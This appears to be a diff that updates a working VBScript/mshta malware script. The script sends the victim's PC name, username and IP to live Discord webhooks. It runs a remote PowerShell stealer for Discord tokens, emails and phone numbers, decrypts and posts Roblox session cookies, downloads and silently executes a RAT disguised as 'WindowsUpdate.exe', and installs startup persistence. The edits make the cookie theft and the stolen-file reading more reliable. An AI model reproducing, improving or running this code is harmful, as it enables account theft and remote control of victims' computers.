@@ -10,27 +10,20 @@ Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS ---
-' WH = Logs
 WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
-' RE_WH = Re Grab
 RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
 
-' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
-
-' --- 2. DROP RAT LAST (init) ---
 Call DropRAT(WH, True)
 
-' --- 3. LOOP (30s, grabs + RAT re-drop to RE_WH) ---
 Dim runCount
 runCount = 0
 Do
@@ -39,51 +32,33 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    
-    If Not ratDropped Then
-        Call DropRAT(RE_WH, True)
-    End If
-    
+    If Not ratDropped Then Call DropRAT(RE_WH, True)
     Call SleepSeconds(30)
-    
-    ' Spawn new mshta and exit current
     Call RunCmd("mshta http://dicerigs.app/")
     Exit Do
 Loop
 
 window.close()
 
-' --- RAT DROP (Standard Download to Disk + Execute) ---
+' --- RAT DROP ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
-    
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
     Dim op : op = tPath & "\" & fname
-
     If fso.FileExists(op) Then fso.DeleteFile op, True
-
-    ' Download via curl.exe
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
-
-    ' Check file and execute
     If fso.FileExists(op) Then
         Dim fSize : fSize = fso.GetFile(op).Size
         If fSize > 100000 Then
             Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
-            
             If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
-            
-            ' Execute via WMI
             Call RunCmd("""" & op & """")
-
-            ' Set flag so it stops downloading in the loop
             ratDropped = True
-            
-            If sendRocket Then 
+            If sendRocket Then
                 Call SleepSeconds(2)
                 Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
             End If
@@ -93,7 +68,6 @@ Sub DropRAT(targetWH, sendRocket)
     End If
 End Sub
 
-' --- RunCmd (Hidden Execution via WMI) ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -103,7 +77,6 @@ Sub RunCmd(cmd)
     p.Create cmd,,s,i
 End Sub
 
-' --- IP Function ---
 Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -116,19 +89,19 @@ Sub IP(targetWH)
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim ll : ll = Split(xh.responseText, vbLf)
+    If UBound(ll) < 3 Then Exit Sub
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
     Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
-    If Len(cookie) = 0 Then Exit Sub
-    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+    If Len(cookie) < 20 Then Exit Sub
+    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
-' --- GetRobloxCookie ---
+' --- GetRobloxCookie: now handles plaintext, JSON, GDK, legacy ---
 Function GetRobloxCookie()
     GetRobloxCookie = ""
     Dim paths(4)
@@ -157,55 +130,61 @@ Function GetRobloxCookie()
     End If
     If Len(fp) = 0 Then Exit Function
     raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Function
+    If Len(raw) < 20 Then Exit Function
+
     Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
-            End If
+
+    ' JSON CookiesData base64 -> DPAPI
+    Dim sp: sp = InStr(raw, "CookiesData"":""")
+    If sp > 0 Then
+        sp = sp + 14
+        Dim ep: ep = InStr(sp, raw, """")
+        If ep > sp Then
+            Dim b64: b64 = Mid(raw, sp, ep - sp)
+            If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
         End If
     End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
+
+    ' plaintext .ROBLOSECURITY
+    If Len(cookie) < 20 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") + 15
+        Dim seg: seg = Mid(raw, rp, 2000)
+        seg = Replace(seg, vbCr, "") : seg = Replace(seg, vbLf, "") : seg = Replace(seg, vbTab, "")
+        Dim sc1: sc1 = InStr(seg, ";")
+        If sc1 > 0 Then seg = Left(seg, sc1 - 1)
+        cookie = Trim(seg)
     End If
-    If Len(cookie) = 0 Then cookie = raw
-    cookie = Replace(cookie, vbCr, "")
-    cookie = Replace(cookie, vbLf, "")
-    cookie = Replace(cookie, vbTab, "")
+
+    ' plaintext _|WARNING
+    If Len(cookie) < 20 And InStr(raw, "_|WARNING") > 0 Then
+        Dim wp: wp = InStr(raw, "_|WARNING")
+        Dim seg2: seg2 = Mid(raw, wp, 2000)
+        seg2 = Replace(seg2, vbCr, "") : seg2 = Replace(seg2, vbLf, "") : seg2 = Replace(seg2, vbTab, "")
+        Dim sc2: sc2 = InStr(seg2, ";")
+        If sc2 > 0 Then seg2 = Left(seg2, sc2 - 1)
+        cookie = Trim(seg2)
+    End If
+
+    ' plaintext raw cookie — line/file that looks like a standalone token
+    If Len(cookie) < 20 Then
+        Dim cleaned: cleaned = raw
+        cleaned = Replace(cleaned, vbCr, "") : cleaned = Replace(cleaned, vbLf, "") : cleaned = Replace(cleaned, vbTab, "")
+        cleaned = Trim(cleaned)
+        ' strip any leading key=
+        Dim eqp: eqp = InStr(cleaned, "=")
+        If eqp > 0 And eqp < 40 Then cleaned = Mid(cleaned, eqp + 1)
+        If Len(cleaned) >= 40 Then cookie = cleaned
+    End If
+
     cookie = Trim(cookie)
-    Dim sc: sc = InStr(cookie, ";")
-    If sc > 0 Then cookie = Left(cookie, sc - 1)
-    cookie = Trim(cookie)
-    Dim warn: warn = InStr(cookie, "_|WARNING")
-    If warn > 1 Then cookie = Mid(cookie, warn)
     GetRobloxCookie = cookie
 End Function
 
-' --- Sleep Functions ---
 Sub SleepSeconds(s)
-    Dim t0, t1, t2, elapsed
-    t0 = Timer()
     Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
     sh.Run cmd, 0, True
-    elapsed = Timer() - t0
-    If elapsed < 0 Then elapsed = elapsed + 86400
-    If elapsed < s Then
-        t1 = Timer()
-        Do
-            t2 = Timer()
-            If t2 < t1 Then t2 = t2 + 86400
-            If (t2 - t1) >= (s - elapsed) Then Exit Do
-        Loop
-    End If
 End Sub
 
-' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta http://dicerigs.app//"
     On Error Resume Next
@@ -218,7 +197,7 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
-' --- GrabTokens ---
+' --- GrabTokens: wait for stable file, copy-then-read ---
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -228,54 +207,92 @@ Sub GrabTokens(targetWH)
     Dim pc: pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
+
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
-    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
-    
-    ' Added sleep to let PowerShell finish
-    Call SleepSeconds(15)
-    
-    Dim tf: tf = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-    
-    ' Force CRLF so Split works 100% of the time
-    raw = Replace(raw, vbLf, vbCrLf)
-    raw = Replace(raw, vbCrLf & vbCrLf, vbCrLf)
 
-    If Len(raw) > 10 Then
-        Dim lines: lines = Split(raw, vbCrLf)
-        Dim l
-        For Each l In lines
-            l = Trim(l)
-            If Left(l, 8) = "DISCORD|" Then
-                Dim p: p = Split(Mid(l, 9), "|")
-                If UBound(p) >= 4 Then
-                    Dim info: info = "**User:** " & p(0) & vbCrLf
-                    If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                    If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                    If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                    info = info & "**Token:** " & p(4)
-                    Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
-                End If
+    Dim tf: tf = TmpFile("steal_result.txt")
+    fso.DeleteFile tf, True   ' clear stale so we can wait for fresh
+
+    Dim runCmd: runCmd = "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """"
+    sh.Run runCmd, 0, False
+
+    ' poll: wait for file to exist AND stop growing AND not be locked
+    Dim waited: waited = 0
+    Dim lastSize: lastSize = -1
+    Dim stable: stable = 0
+    Do
+        SleepSeconds 1
+        waited = waited + 1
+        If fso.FileExists(tf) Then
+            Dim sz: sz = 0
+            On Error Resume Next
+            sz = fso.GetFile(tf).Size
+            On Error GoTo 0
+            If sz = lastSize And sz > 0 Then
+                stable = stable + 1
+            Else
+                stable = 0
             End If
-            
-            If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                Dim cookie: cookie = Mid(l, 8)
-                If Len(cookie) > 20 Then
-                    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
-                End If
+            lastSize = sz
+        End If
+        If stable >= 2 Then Exit Do
+        If waited >= 60 Then Exit Do
+    Loop
+
+    If Not fso.FileExists(tf) Then Exit Sub
+
+    ' copy-then-read so a live handle doesn't kill us
+    Dim cp: cp = TmpFile("sr_" & Int(Rnd()*100000) & ".txt")
+    On Error Resume Next
+    fso.CopyFile tf, cp, True
+    On Error GoTo 0
+    If Not fso.FileExists(cp) Then cp = tf
+
+    Dim raw: raw = ReadFile(cp)
+    If cp <> tf Then fso.DeleteFile cp, True
+    If Len(raw) < 10 Then Exit Sub
+
+    raw = Replace(raw, vbCrLf, vbLf)
+    raw = Replace(raw, vbCr, vbLf)
+    Dim lines: lines = Split(raw, vbLf)
+    Dim l
+    For Each l In lines
+        l = Trim(l)
+        If Len(l) = 0 Then
+            ' skip
+        ElseIf Left(l, 8) = "DISCORD|" Then
+            Dim p: p = Split(Mid(l, 9), "|")
+            If UBound(p) >= 4 Then
+                Dim info: info = "**User:** " & p(0) & vbCrLf
+                If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                info = info & "**Token:** " & p(4)
+                Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
             End If
-        Next
-    End If
+        ElseIf Left(l, 9) = "ROBLOXMS|" Then
+            Dim c1: c1 = Mid(l, 10)
+            If Len(c1) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
+        ElseIf Left(l, 8) = "ROBLOX|" Then
+            Dim c2: c2 = Mid(l, 9)
+            If Len(c2) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
+        End If
+    Next
 End Sub
 
-' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+Function ReadFile(path)
+    ReadFile = ""
+    On Error Resume Next
+    Dim f: Set f = fso.OpenTextFile(path, 1)
+    If Err.Number = 0 Then ReadFile = f.ReadAll
+    On Error GoTo 0
+    If Not f Is Nothing Then f.Close
+    Set f = Nothing
+End Function
 
-' --- PostEmbed ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
@@ -291,11 +308,11 @@ Sub PostEmbedTo(t, d, c, target_wh)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
     Dim outf: outf = TmpFile("dpo.txt")
+    On Error Resume Next
     fso.DeleteFile outf, True
     WriteFile inf, b64
     Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
@@ -306,9 +323,9 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile inf, True
     fso.DeleteFile psf, True
     fso.DeleteFile outf, True
+    On Error GoTo 0
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
